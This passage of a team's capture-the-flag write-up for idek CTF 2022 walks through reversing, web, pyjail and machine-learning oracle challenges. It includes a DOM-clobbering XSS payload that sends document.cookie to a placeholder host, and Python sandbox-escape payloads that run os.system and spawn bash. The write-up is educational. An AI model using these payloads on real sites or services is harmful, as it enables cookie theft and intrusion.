+key <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;[System.IO.File]::ReadAllBytes($_.FullName)&#39;</span>
+makedirs(<span style="color:#e6db74">&#34;HiddenGem&#34;</span>, exist_ok<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>)
+<span style="color:#66d9ef">for</span> fn <span style="color:#f92672">in</span> files:
+    files[fn] <span style="color:#f92672">=</span> bytes(map(int, ARC4<span style="color:#f92672">.</span>new(key)<span style="color:#f92672">.</span>decrypt(files[fn])<span style="color:#f92672">.</span>split(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34; &#34;</span>)))
+    open(<span style="color:#e6db74">&#34;HiddenGem/&#34;</span> <span style="color:#f92672">+</span> fn, <span style="color:#e6db74">&#34;wb&#34;</span>)<span style="color:#f92672">.</span>write(files[fn])
+
+</code></pre></div><p>Check the file named <code>SecretPlan.pdf</code>. There is a table on the 2nd page:</p>
+<p><img src="https://i.imgur.com/bwYVMLk.png" alt=""></p>
+<p>From there we obtained the flag: <code>idek{RDP_Cache_1s_g0OD_bu7_1_h4t3_t4K1n9_t3x7_fr0M_Im4g3s}</code></p>
+<p>BTW: there is a file named <code>update.ps1</code> with the same leaking mechanism with the above malicious script.</p>
+<h2 id="reverse">Reverse<a hidden class="anchor" aria-hidden="true" href="#reverse">#</a></h2>
+<h3 id="polyglot-42-solves">Polyglot (42 solves)<a hidden class="anchor" aria-hidden="true" href="#polyglot-42-solves">#</a></h3>
+<p><em>Solved by TWY, fsharp</em></p>
+<p>The binary given is a polyglot: It is both a valid AArch64 and x86_64 Linux program. The flag is split into two parts, and each part could be found by reverse engineering the binary as one of the two aforementioned program types.</p>
+<p><strong>Part 1: AArch64</strong> (solved by fsharp)</p>
+<p>The program does the following:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">binary <span style="color:#f92672">=</span> open(<span style="color:#e6db74">&#34;polyglot&#34;</span>, <span style="color:#e6db74">&#34;rb&#34;</span>)<span style="color:#f92672">.</span>read(<span style="color:#ae81ff">124</span>)
+
+decoded <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>
+<span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">28</span>):
+    xord <span style="color:#f92672">=</span> binary[i <span style="color:#f92672">+</span> <span style="color:#ae81ff">68</span>] <span style="color:#f92672">^</span> binary[i <span style="color:#f92672">+</span> <span style="color:#ae81ff">96</span>]
+    decoded <span style="color:#f92672">+=</span> chr(xord)
+</code></pre></div><p>It does not print the decoded string, so we need to decode it ourselves. We get <code>idek{__Why_50_m4nY_4rch5_l1k</code> as the first part of the flag.</p>
+<p><strong>Part 2: x86_64</strong> (solved by TWY)</p>
+<p>For this part, it is actually not too difficult to read the decompiled code generated by Ghidra, but needs more effort to understand and reimlement the pointer logic if not executing the raw binary.</p>
+<p>Manual Reimplementation</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-py" data-lang="py"><span style="color:#75715e"># 0x85(v2, &amp;(binary[0x3a1] copied), 0x20)</span>
+v5 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
+v2 <span style="color:#f92672">=</span> list(binary[<span style="color:#ae81ff">0x2a1</span>:<span style="color:#ae81ff">0x3a1</span>]) <span style="color:#75715e"># list(range(256))</span>
+v3 <span style="color:#f92672">=</span> binary[<span style="color:#ae81ff">0x3a1</span>:<span style="color:#ae81ff">0x3c1</span>]
+a2 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x20</span>
+<span style="color:#66d9ef">for</span> v4 <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">0x100</span>):
+    v6 <span style="color:#f92672">=</span> v2[v4]
+    v5 <span style="color:#f92672">=</span> (v5 <span style="color:#f92672">+</span> v6 <span style="color:#f92672">+</span> v3[v4 <span style="color:#f92672">%</span> a2]) <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">255</span>
+    v2[v4] <span style="color:#f92672">=</span> v2[v5]
+    v2[v5] <span style="color:#f92672">=</span> v6
+
+<span style="color:#75715e"># 0x1a2(v2, &amp;(binary[0x3c1] copied), 0x17)</span>
+v7 <span style="color:#f92672">=</span> list(binary[<span style="color:#ae81ff">0x3c1</span>:]) <span style="color:#f92672">+</span> list(binary[<span style="color:#ae81ff">0x226</span>:<span style="color:#ae81ff">0x22e</span>])
+a1 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
+<span style="color:#66d9ef">for</span> v7p <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">0x17</span>):
+    pv6 <span style="color:#f92672">=</span> (v7p <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>) <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">255</span>
+    cv2 <span style="color:#f92672">=</span> v2[pv6]
+    a1 <span style="color:#f92672">=</span> (a1 <span style="color:#f92672">+</span> cv2) <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">255</span>
+    v2[pv6] <span style="color:#f92672">=</span> cv3 <span style="color:#f92672">=</span> v2[a1]
+    v2[a1] <span style="color:#f92672">=</span> cv2
+    v7[v7p] <span style="color:#f92672">^=</span> v2[(cv2 <span style="color:#f92672">+</span> cv3) <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">255</span>]
+
+<span style="color:#75715e"># result: v7</span>
+</code></pre></div><p><strong>It is RC4 (again). (Check <a href="#3-the-ultimate-goal-14-solves">HiddenGem 3</a>)</strong></p>
+<p>Complete Solve Script:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">from</span> Crypto.Cipher <span style="color:#f92672">import</span> ARC4
+binary <span style="color:#f92672">=</span> open(<span style="color:#e6db74">&#34;polyglot&#34;</span>, <span style="color:#e6db74">&#34;rb&#34;</span>)<span style="color:#f92672">.</span>read()
+flag1 <span style="color:#f92672">=</span> bytes([a <span style="color:#f92672">^</span> b <span style="color:#66d9ef">for</span> a, b <span style="color:#f92672">in</span> zip(binary[<span style="color:#ae81ff">0x44</span>:<span style="color:#ae81ff">0x60</span>], binary[<span style="color:#ae81ff">0x60</span>:<span style="color:#ae81ff">0x7c</span>])])
+flag2 <span style="color:#f92672">=</span> ARC4<span style="color:#f92672">.</span>new(binary[<span style="color:#ae81ff">0x3a1</span>:<span style="color:#ae81ff">0x3c1</span>])<span style="color:#f92672">.</span>encrypt(binary[<span style="color:#ae81ff">0x3c1</span>:] <span style="color:#f92672">+</span> binary[<span style="color:#ae81ff">0x226</span>:<span style="color:#ae81ff">0x22e</span>])
+print((flag1 <span style="color:#f92672">+</span> flag2)<span style="color:#f92672">.</span>decode())
+</code></pre></div><p>Flag: <code>idek{__Why_50_m4nY_4rch5_l1k3_X86_N_4rM_1n_0n3_biN}</code></p>
+<h2 id="web">Web<a hidden class="anchor" aria-hidden="true" href="#web">#</a></h2>
+<h3 id="readme-176-solves">Readme (176 solves)<a hidden class="anchor" aria-hidden="true" href="#readme-176-solves">#</a></h3>
+<p><em>Solved by fsharp, J4cky</em></p>
+<p>A Go script is provided. A 24576-byte buffer called <code>randomData</code> is filled with bytes generated from <code>rand.Read()</code>, and the SHA256 hash of <code>idek</code> is moved to index <code>12625</code> in the buffer. We could POST a JSON array called <code>Orders</code> to <code>http://readme.chal.idek.team:1337/just-read-it</code>, which contains at most 10 positive integers between 1 and 100.</p>
+<p>The script reads, from <code>randomData</code>, the numbers of bytes specified by each integer in the <code>Orders</code> array. When the integer is between 1 and 99, the corresponding number of bytes are read. However, when the integer is 100, something strange happens: <code>bufio.NewReader()</code> is called on the reader variable before the read happens.</p>
+<p>The goal is to get the script to read in exactly 12625 bytes.</p>
+<p>It appears that at most 100 bytes could be read each time. We decided to do a little testing: By POSTing an array consisting of at least six 100s, we get an error that says <code>failed to read: read error: EOF</code>.</p>
+<p>What happened was that the <code>bufio.NewReader()</code> and read function calls together ended up <a href="https://medium.com/golangspec/introduction-to-bufio-package-in-golang-ad7d1877f762">reading in 4096 bytes</a> instead of the expected 100. So, there is a way to read more than 100 bytes each time after all.</p>
+<p>By doing some math, we could figure out what numbers to POST to read in exactly 12625 bytes:</p>
+<p>4096 + 4096 + 4096 + 99 + 99 + 99 + 40 = 12625</p>
+<p>So, we POST <code>{&quot;Orders&quot;:[100,100,100,99,99,99,40]}</code> and successfully get the flag: <code>idek{BufF3r_0wn3rsh1p_c4n_b1t3!}</code></p>
+<h3 id="simplefileserver-98-solves">SimpleFileServer (98 solves)<a hidden class="anchor" aria-hidden="true" href="#simplefileserver-98-solves">#</a></h3>
+<p><em>Solved by RaccoonNinja, Kaiziron, fsharp; write-up by RaccoonNinja</em></p>
+<p>The goal is to forge an admin cookie <code>{&quot;admin&quot;:true}</code> and access <code>/flag</code>.</p>
+<p>The key insight is that symlinks can be put in your zip. For sake of convenience I symlinked to <code>/</code> and we are getting whatever we want (as far as our permission goes).</p>
+<p>There are 2 pieces of the puzzle:</p>
+<ul>
+<li><strong>Time when the service was started</strong>. This is found in <code>/tmp/server.log</code></li>
+<li><strong>Offset</strong>. This is found in <code>/app/config.py</code> (kudos to Kaiziron for reminding us)</li>
+</ul>
+<p>There are only 1000 possibilities which can be quickly bruteforced.</p>
+<h3 id="paywall-71-solves">Paywall (71 solves)<a hidden class="anchor" aria-hidden="true" href="#paywall-71-solves">#</a></h3>
+<p><em>Solved by ozetta; write-up by RaccoonNinja</em></p>
+<p>The goal is to get the flag but somehow we need to prepend the string <code>FREE</code> to it. A useful tool is php&rsquo;s <a href="https://www.php.net/manual/en/wrappers.php.php">php:// protocol</a>, which supports a wide range of <a href="https://www.php.net/manual/en/wrappers.php">wrappers and filters for processing</a>.</p>
+<p>A useful resource is synacktiv&rsquo;s <a href="https://github.com/synacktiv/php_filter_chain_generator">php filter chain generator</a>. The payload can be generated with ease from <code>python3 php_filter_chain_generator.py --chain 'FREE  '</code>.</p>
+<p><img src="https://i.imgur.com/y75fVUH.png" alt=""></p>
+<h3 id="json-beautifier-15-solves">JSON Beautifier (15 solves)<a hidden class="anchor" aria-hidden="true" href="#json-beautifier-15-solves">#</a></h3>
+<p><em>Solved by ozetta, RaccoonNinja; write-up by RaccoonNinja</em></p>
+<p><strong>A purely client-side challenge!</strong> We have to send a self-XSS link to admin and steal his cookie.</p>
+<p>A few keypoints:</p>
+<ul>
+<li>
+<p>The sink is obviously:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js">eval(<span style="color:#e6db74">`beautified = </span><span style="color:#e6db74">${</span><span style="color:#a6e22e">output</span><span style="color:#e6db74">}</span><span style="color:#e6db74">`</span>);
+</code></pre></div><p>This means we have to corrupt <code>output</code>, which is created from <code>userJson</code>.</p>
+</li>
+<li>
+<p>strings up to 10 chars are accepted in <code>space</code> argument:
+<img src="https://i.imgur.com/BvNNWAn.png" alt="MDN doc"></p>
+</li>
+<li>
+<p>supplying <code>`</code> gives easy string context bypass:
+<img src="https://i.imgur.com/D5pfxrj.png" alt="Space argument example"></p>
+</li>
+<li>
+<p>the entry point is definitely DOM-XSS: <code>outputBox.innerHTML = `&lt;pre&gt;${output}&lt;/pre&gt;`</code></p>
+<ul>
+<li>it&rsquo;s limited by the strict CSP-Policy <code>script-src 'unsafe-eval' 'self'; object-src 'none'</code>, meaning we <strong>cannot insert any script tag or inline events</strong></li>
+<li>this narrows down the hunt to (do something) -&gt; set <code>this.config.debug</code> and <code>this.config.ops.cols</code> -&gt; trigger beautify -&gt; free eval (knowing the order and working in an organized way is essential)</li>
+</ul>
+</li>
+<li>
+<p>A good candidate would to set global properties would be <a href="https://portswigger.net/research/dom-clobbering-strikes-back">DOM clobbering</a>. <em>However</em>, while any truthy value will work for debug, <code>cols</code> has to be poisoned as string, not the usual HTMLInputElement type. Ozetta did most researches on this part and continued to create the final payload</p>
+<ul>
+<li>(organized post CTF) A good resource by <a href="https://portswigger.net/research/dom-clobbering-strikes-back">PortSwigger</a> describes how the properties can be enumerated and after enumeration, only frameset:cols can be string (textarea:cols is number).</li>
+<li><code>&lt;frameset id=debug&gt;&lt;frameset id=&quot;config&quot; cols=&quot;`'&quot;&gt;</code></li>
+<li><code>&lt;iframe name=config srcdoc='&lt;frameset id=debug&gt;&lt;frameset id=opts cols=&quot;`+&quot;&gt;'&gt;&lt;/iframe&gt;</code></li>
+</ul>
+</li>
+<li>
+<p>When the dom clobbering payload is loaded to the dom, we can invoke <code>beautiful</code> by loading <code>main.js</code> again</p>
+<ul>
+<li><code>&lt;iframe name=config srcdoc='&lt;frameset id=debug&gt;&lt;frameset id=opts cols=&quot;`+&quot;&gt;'&gt;&lt;/iframe&gt;&lt;script src=static/js/main.js&gt;&lt;/script&gt;</code></li>
+</ul>
+</li>
+<li>
+<p>We can apply our XSS payload (simplified post-CTF)</p>
+<ul>
+<li><code>&lt;textarea id=json-input&gt;[&amp;quot;`+(location=`https://XXXX/`+document.cookie)//&amp;quot;]&lt;/textarea&gt;</code></li>
+</ul>
+</li>
+<li>
+<p>The whole thing should be in an iframe, which is injected as the first step.</p>
+<ul>
+<li><code>http://json-beautifier.chal.idek.team:1337/?json=%22%3Ciframe+srcdoc%3D%27%3Ctextarea+id%3Djson-input%3E%5B%26quot%3B%60%2B(location%3D%60https%3A%2F%2FXXXX%2F%60%2Bdocument.cookie)//%26quot%3B%5D%3C%2Ftextarea%3E%3Ciframe+name%3Dconfig+srcdoc%3D%26apos%3B%3Cframeset+id%3Ddebug%3E%3Cframeset+id%3Dopts+cols%3D%26quot%3B%60%26quot%3B%3E%26apos%3B%3E%3C%2Fiframe%3E%3Cscript+src%3Dstatic%2Fjs%2Fmain.js%3E%3C%2Fscript%3E%27%3E%22</code></li>
+</ul>
+</li>
+</ul>
+<h2 id="misc">Misc<a hidden class="anchor" aria-hidden="true" href="#misc">#</a></h2>
+<h3 id="pyjail-22-solves">pyjail (22 solves)<a hidden class="anchor" aria-hidden="true" href="#pyjail-22-solves">#</a></h3>
+<p><em>Solved by Hollow, LifeIsHard, TWY, J4cky; write-up by TWY</em></p>
+<p>This challenge is a pyjail with the below forbidden characters and overrided global functions for <code>eval</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-py" data-lang="py">blocklist <span style="color:#f92672">=</span> [<span style="color:#e6db74">&#39;.&#39;</span>, <span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">&#39;</span>, <span style="color:#e6db74">&#39;[&#39;</span>, <span style="color:#e6db74">&#39;]&#39;</span>, <span style="color:#e6db74">&#39;{&#39;</span>, <span style="color:#e6db74">&#39;}&#39;</span>,<span style="color:#e6db74">&#39;:&#39;</span>]
+DISABLE_FUNCTIONS <span style="color:#f92672">=</span> [<span style="color:#e6db74">&#34;getattr&#34;</span>, <span style="color:#e6db74">&#34;eval&#34;</span>, <span style="color:#e6db74">&#34;exec&#34;</span>, <span style="color:#e6db74">&#34;breakpoint&#34;</span>, <span style="color:#e6db74">&#34;lambda&#34;</span>, <span style="color:#e6db74">&#34;help&#34;</span>]
+DISABLE_FUNCTIONS <span style="color:#f92672">=</span> {func: <span style="color:#66d9ef">None</span> <span style="color:#66d9ef">for</span> func <span style="color:#f92672">in</span> DISABLE_FUNCTIONS}
+</code></pre></div><p>In the first version, we have infinite eval allowed. Allowing neither <code>.</code> nor <code>getattr</code> means that we cannot use the method provided. However we can still modify or delete the attributes by <code>setattr</code> and <code>delattr</code></p>
+<p>Our target is to execute <code>/readflag &quot;giveflag&quot;</code> which prints out the flag.</p>
+<p>Our payload:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-py" data-lang="py">setattr(__import__(<span style="color:#e6db74">&#39;__main__&#39;</span>),<span style="color:#e6db74">&#39;blocklist&#39;</span>,list())
+__import__(<span style="color:#e6db74">&#39;os&#39;</span>)<span style="color:#f92672">.</span>system(<span style="color:#e6db74">&#39;/readflag giveflag&#39;</span>)
+</code></pre></div><p>which works by removing the blocklist in main, then executing the shell command.</p>
+<p>For Pyjail Revenge, there is only 1 trial with 3 more entries in the blocklist (<code>&quot;blocklist&quot;, &quot;globals&quot;, compile&quot;</code>) which does not have any effect as we can use string concatenation (like <code>&quot;glo&quot; + &quot;bals&quot;</code>) or abusing NFKD (like <code>globᵃls</code>) to bypass all use cases.</p>
+<p>We did not dig much further on that during the competition.</p>
+<p>Flag: <code>idek{9eece9b4de9380bc3a41777a8884c185}</code></p>
+<p>Post-mortem: We realized that <code>DISABLE_FUNCTIONS</code> is just a mask on the original builtins that we can delete to get back the original builtin functions.</p>
+<p>Flag for Pyjail Revenge:</p>
+<p>Sample Payload:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-py" data-lang="py">setattr(license,<span style="color:#e6db74">&#39;__dict__&#39;</span>,globᵃls()),delattr(license,<span style="color:#e6db74">&#39;breakpoint&#39;</span>),breakpoint()
+(Pdb) <span style="color:#f92672">import</span> os; os<span style="color:#f92672">.</span>system(<span style="color:#e6db74">&#34;bash&#34;</span>)
+<span style="color:#960050;background-color:#1e0010">$</span> <span style="color:#f92672">/</span>readflag giveflag
+idek{what_used_to_be_a_joke_has_now_turned_into_an_pyjail_escape<span style="color:#f92672">.</span>How_wonderful<span style="color:#960050;background-color:#1e0010">!</span>}
+</code></pre></div><p><code>idek{what_used_to_be_a_joke_has_now_turned_into_an_pyjail_escape.How_wonderful!}</code></p>
+<p>Intended Solution (by downgrade#0778):</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-py" data-lang="py">__import__(<span style="color:#e6db74">&#39;antigravity&#39;</span>,setattr(__import__(<span style="color:#e6db74">&#39;os&#39;</span>),<span style="color:#e6db74">&#39;environ&#39;</span>,dict(BROWSER<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;/bin/sh -c &#34;/readflag giveflag&#34; #</span><span style="color:#e6db74">%s</span><span style="color:#e6db74">&#39;</span>)))
+</code></pre></div><p>It works by overriding the shell code (and commenting out the url of <a href="https://xkcd.com/353/">the Easter Egg</a>) used by the <a href="https://github.com/python/cpython/blob/main/Lib/antigravity.py"><code>antigravity</code> module</a> to launch a browser (<a href="https://github.com/python/cpython/blob/main/Lib/webbrowser.py#L585"><code>webbrowser</code> module</a>).</p>
+<h3 id="manager-of-the-year-series">Manager Of The Year Series<a hidden class="anchor" aria-hidden="true" href="#manager-of-the-year-series">#</a></h3>
+<p><em>Solved by LifeIsHard, Mystiz</em></p>
+<h4 id="part-1-14-solves">Part 1 (14 solves)<a hidden class="anchor" aria-hidden="true" href="#part-1-14-solves">#</a></h4>
+<p><strong>Challenge description</strong></p>
+<blockquote>
+<p>Just another ML challenge</p>
+</blockquote>
+<p>In the source code, there are variables like <code>X_train</code>, <code>y_train</code>, <code>X_test</code> and <code>y_test</code>. We need to predict <code>y_test</code> and have a small enough <a href="https://en.wikipedia.org/wiki/Root-mean-square_deviation">RMSE</a>. At first glance, it seems to be a Machine Learning challenge.</p>
+<p><strong>Data explanation</strong></p>
+<ul>
+<li><code>X_train</code> and <code>X_test</code> are independent features
+<ul>
+<li>temperature</li>
+<li>fuel_price</li>
+<li>cpi</li>
+<li>unemployment</li>
+<li>net_cost_price_in_thousands</li>
+<li>average_user_points</li>
+<li>average_critic_points</li>
+<li>average_items_sold_in_thousands</li>
+</ul>
+</li>
+<li><code>y_train</code> and <code>y_test</code> are dependent variables, which is our target
+<ul>
+<li>revenue_in_thousands</li>
+</ul>
+</li>
+</ul>
+<p>However, we can notice some unusual parts from the source code.</p>
+<ol>
+<li>We can only get flag if our prediction can meet <code>rmse &lt; 1e-8</code>, the threshold is <strong>unreasonably low</strong> and could hardly be achieved by ML.</li>
+<li>We got <strong>a lot of</strong> request limit (i.e. chances to test our prediction). We can send our predictions for at most 367 times, and we can know the RMSE value for our predictions.
+<ul>
+<li>Note: the request limit is written as
+<code>n_days = 365</code>
+<code>n_reqs_lim = n_days + 2</code></li>
+</ul>
+</li>
+</ol>
+<p><strong>RMSE formula</strong></p>
+<p>$$\text{RMSE}=\sqrt{\frac{ \sum_{i=1}^{N} (Predicted_i-Actual_i)^2}{N}}$$</p>
+<p>Assuming, if we only change our prediction for $i=1$ and keep our prediction for $i=2\ \text{to}\ 365$ the same. We can get the two equations:</p>
+<p>$$
+\begin{aligned}
+\color{#91f2f1}{\text{RMSE}'}=\sqrt{\frac{(\color{#91f2f1}{\hat{y}'_0}-y_0)^2+(\hat{y}_1-y_1)^2+&hellip;+(\hat{y}_{365}-y_{365})^2}{N}} \\
+\color{#91f2f1}{\text{RMSE}''}=\sqrt{\frac{(\color{#91f2f1}{\hat{y}''_0}-y_0)^2+(\hat{y}_1-y_1)^2+&hellip;+(\hat{y}_{365}-y_{365})^2}{N}}
+\end{aligned}
+$$</p>
+<p>Only the <!-- raw HTML omitted -->blue<!-- raw HTML omitted --> parts are different. By rearranging and subtracting one equation from the other, we can get the value of $y_0$ (i.e. the value that we need to &ldquo;predict&rdquo;).</p>
+<p>$$y_0=\frac{(\text{RMSE}'')^2N-(\text{RMSE}')^2N-{\hat{y}''_0}^2+{\hat{y}'_0}^2}{2(\hat{y}'_0-\hat{y}''_0)}$$</p>
+<p>To make it simpler, we can set</p>
+<ul>
+<li>first prediction: $\hat{y}'_0=0$</li>
+<li>second prediction: $\hat{y}''_0=100$</li>
+</ul>
+<p>$$y_0=\frac{(\text{RMSE}'')^2N-(\text{RMSE}')^2N-{100}^2}{-200}$$</p>
+<p>We can do the same for each data point. Then we can get the exact <code>y_test</code> value.
+We need $365+1$ requests to get the value for $365$ $y$-value, then use the last $1$ request to submit the correct values. This matches the request limit of <code>n_reqs_lim = n_days + 2</code>.</p>
+<p><em>Note: As the RMSE we get is not an exact value, we can make our &ldquo;prediction&rdquo; more precise by rounding the calculated value to 2 decimal places.</em></p>
+<p><strong>Solve script</strong>
+<a href="https://gist.github.com/LifeIsHardd/dfc323394322aad847fbdfd43d366a4f">idek2022_manager1_solve.py</a></p>
+<p>Flag: <code>idek{595a8beb7d381e7f3a8b2d4c88fe8b9b}</code></p>
+<h4 id="part-2-10-solves">Part 2 (10 solves)<a hidden class="anchor" aria-hidden="true" href="#part-2-10-solves">#</a></h4>
+<p><strong>Challenge description</strong></p>
+<blockquote>
+<p>Yet another ML challenge</p>
+</blockquote>
+<p>The source code is pretty similar to Part 1.</p>
+<p><strong>Comparison</strong></p>
+<table>
+<thead>
+<tr>
+<th></th>
+<th>Part 1</th>
+<th>Part 2</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Check for data quality</td>
+<td>N/A</td>
+<td><code>test_data.min() &gt;= 0</code><!-- raw HTML omitted --><code>test_data.max() &lt;= 100</code></td>
+</tr>
+<tr>
+<td>Requirement</td>
+<td><code>rmse &lt; 1e-8</code></td>
+<td><code>rmse &lt; 0.07</code></td>
+</tr>
+<tr>
+<td>Request limit</td>
+<td>367</td>
+<td>7000</td>
+</tr>
+<tr>
+<td>Message</td>
+<td>Value of <code>rmse</code> is given</td>
+<td>Only know if <code>mse &gt; prev_mse</code></td>
+</tr>
+</tbody>
+</table>
+<p>As the value of RMSE is not given, we cannot use the method in Part 1.
+However, the threshold is loosened and we can send more requests.</p>
+<p>It is likely that this is <strong>NOT</strong> a ML challenge because the high request limit (7000).
+As we can have some information about the RMSE (higher or lower than the previous one), we can make some guesses and narrow the range of the correct value.</p>
+<p>We only need the range to be <code>&lt; 0.14</code>, then we can take the middle value and be sure that the error for that $y_i$ is <code>&lt; 0.07</code>.</p>
+<p><strong>Method 1</strong></p>
+<ul>
+<li>Use 2 attempts for a 50% range cut</li>
+<li>Takes 20 attempts for each data point (to make sure range <code>&lt; 0.14</code>)</li>
+<li>Illustration
+<ul>
+<li>Correct value = 41.32</li>
+<li>For row 1, <code>rmse2 &gt; rmse1</code>, value is closer to 0 (lower bound)
+<ul>
+<li>change upper bound, range becomes [0,50]</li>
+</ul>
+</li>
+<li>For row 2, <code>rmse2 &lt;= rmse1</code>, value is closer to 50 (upper bound)
+<ul>
+<li>change lower bound, range becomes [25,50]</li>
+</ul>
+</li>
+<li>etc.</li>
+</ul>
+</li>
+</ul>
+<table>
+<thead>
+<tr>
+<th></th>
+<th>Bounds</th>
+<th>Range</th>
+<th>Request1</th>
+<th>Request2</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>1</td>
+<td>[0,100]</td>
+<td>100</td>
+<td>0</td>
+<td>100</td>
+</tr>
+<tr>
+<td>2</td>
+<td>[0,50]</td>
+<td>50</td>
+<td>0</td>
+<td>50</td>
+</tr>
+<tr>
+<td>3</td>
+<td>[25,50]</td>
+<td>25</td>
+<td>25</td>
+<td>50</td>
+</tr>
+<tr>
+<td>4</td>
+<td>[37.5,50]</td>
+<td>12.5</td>
+<td>37.5</td>
+<td>50</td>
+</tr>
+<tr>
+<td>5</td>
+<td>[37.5,43.75]</td>
+<td>6.25</td>
+<td>37.5</td>
+<td>43.75</td>
+</tr>
+<tr>
+<td>6</td>
+<td>[40.625, 43.75]</td>
+<td>3.125</td>
+<td>40.625</td>
+<td>43.75</td>
+</tr>
+<tr>
+<td>7</td>
+<td>[40.625, 42.1875]</td>
+<td>1.5625</td>
+<td>40.625</td>
+<td>42.1875</td>
+</tr>
+<tr>
+<td>8</td>
+<td>[40.625, 41.40625]</td>
+<td>0.78125</td>
+<td>40.625</td>
+<td>41.40625</td>
+</tr>
+<tr>
+<td>9</td>
+<td>[41.015625, 41.40625]</td>
+<td>0.390625</td>
+<td>41.015625</td>
+<td>41.40625</td>
+</tr>
+<tr>
+<td>10</td>
+<td>[41.2109375, 41.40625]</td>
+<td>0.1953125</td>
+<td>41.2109375</td>
+<td>41.40625</td>
+</tr>
+<tr>
+<td>11</td>
+<td>[41.30859375, 41.40625]</td>
+<td>0.09765625</td>
+<td>/</td>
+<td>/</td>
+</tr>
+</tbody>
+</table>
+<p><strong>Method 2</strong></p>
+<ul>
+<li>We can save some attempts if either the lower/upper bound = previous request value</li>
+<li>Takes 11-20 attempts for each data point (to make sure range <code>&lt; 0.14</code>)
+<ul>
+<li>Depends on luck (where the number locate)</li>
+</ul>
+</li>
+<li>Illustration
+<ul>
+<li>Correct value = 41.32</li>
+<li>For row 3, the previous request value is &ldquo;50&rdquo;, we can just request &ldquo;25&rdquo; and we will know whether &ldquo;25&rdquo; or &ldquo;50&rdquo; is closer to the correct value</li>
+<li>For row 6, the previous request value is &ldquo;43.75&rdquo;</li>
+<li>For row 7, the previous request value is &ldquo;40.625&rdquo;</li>
+<li>etc.</li>
+<li>In this case, we only need 16 attempts</li>
+</ul>
+</li>
+</ul>
+<table>
+<thead>
+<tr>
+<th></th>
+<th>Bounds</th>
+<th>Range</th>
+<th>Request1</th>
+<th>Request2</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>1</td>
+<td>[0,100]</td>
+<td>100</td>
+<td>0</td>
+<td>100</td>
+</tr>
+<tr>
+<td>2</td>
+<td>[0,50]</td>
+<td>50</td>
+<td>0</td>
+<td>50</td>
+</tr>
+<tr>
+<td>3</td>
+<td>[25,50]</td>
+<td>25</td>
+<td>25</td>
+<td>-</td>
+</tr>
+<tr>
+<td>4</td>
+<td>[37.5,50]</td>
+<td>12.5</td>
+<td>37.5</td>
+<td>50</td>
+</tr>
+<tr>
+<td>5</td>
+<td>[37.5,43.75]</td>
+<td>6.25</td>
+<td>37.5</td>
+<td>43.75</td>
+</tr>
+<tr>
+<td>6</td>
+<td>[40.625, 43.75]</td>
+<td>3.125</td>
+<td>40.625</td>
+<td>-</td>
+</tr>
+<tr>
+<td>7</td>
+<td>[40.625, 42.1875]</td>
+<td>1.5625</td>
+<td>-</td>
+<td>42.1875</td>
+</tr>
+<tr>
+<td>8</td>
+<td>[40.625, 41.40625]</td>
+<td>0.78125</td>
+<td>40.625</td>
+<td>41.40625</td>
+</tr>
+<tr>
+<td>9</td>
+<td>[41.015625, 41.40625]</td>
+<td>0.390625</td>
+<td>41.015625</td>
+<td>-</td>
+</tr>
+<tr>
+<td>10</td>
+<td>[41.2109375, 41.40625]</td>
+<td>0.1953125</td>
+<td>41.2109375</td>
+<td>41.40625</td>
+</tr>
+<tr>
+<td>11</td>
+<td>[41.30859375, 41.40625]</td>
+<td>0.09765625</td>
+<td>/</td>
+<td>/</td>
+</tr>
+</tbody>
+</table>
+<p><strong>Solve script</strong>
+<a href="https://gist.github.com/LifeIsHardd/e9b34044890feffeced21183c775dc42">idek2022_manager2_solve.py</a></p>
+<p>In the above solve script, used Method 2.
+<em>(Ran the code for 4 times, on average using 5616 requests to get the flag.)</em></p>
+<p>Flag: <code>idek{25d3cc2f403ca5177f928b42af494050}</code></p>
+<p><strong>Further enhancement</strong></p>
+<ol>
+<li>Change the range threshold <em>(still 100% solve)</em>
+<ul>
+<li>We require the range to be <code>&lt; 0.14</code> in the above solution</li>
+<li>However, the actual range when satisfying this situation will always be $100/2^{10}=0.09765625$</li>
+<li>It means that we can set the threshold to be larger for some data points</li>
+<li>Let $x$ be the number of threshold $= 0.09765625$, then
